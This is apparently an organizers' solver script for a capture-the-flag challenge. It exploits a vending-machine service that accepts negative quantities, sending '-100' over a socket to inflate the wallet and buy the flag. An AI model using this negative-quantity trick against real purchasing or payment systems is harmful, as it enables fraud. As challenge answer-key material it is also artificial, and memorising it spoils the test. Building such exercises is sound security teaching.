#!/usr/bin/env python3
"""
Mimi's Vending Machine - solver (organizers only, do NOT ship to players).

The machine checks "total > wallet" but never that the quantity is positive.
Buying -100 tuna cans costs -1000 coins, so the wallet goes UP to 1050,
then the Golden Flag (1000 coins) is affordable.

Usage:
    python3 solve.py [host] [port]      # default localhost 1342
"""
import re
import socket
import sys


def main(host, port):
    s = socket.create_connection((host, port), timeout=10)
    buf = ""

    def until(marker):
        nonlocal buf
        while marker not in buf:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk.decode(errors="replace")
        out, _, buf = buf.partition(marker)
        return out + marker

    for item, qty in (("1", "-100"), ("4", "1")):
        until("Choose item: ")
        s.sendall(item.encode() + b"\n")
        until("How many? ")
        s.sendall(qty.encode() + b"\n")

    rest = buf
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        rest += chunk.decode(errors="replace")
    flag = re.search(r"SecurinetsENIT\{[^}]*\}", rest)
    print(flag.group(0) if flag else rest)


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "localhost",
         int(sys.argv[2]) if len(sys.argv) > 2 else 1342)
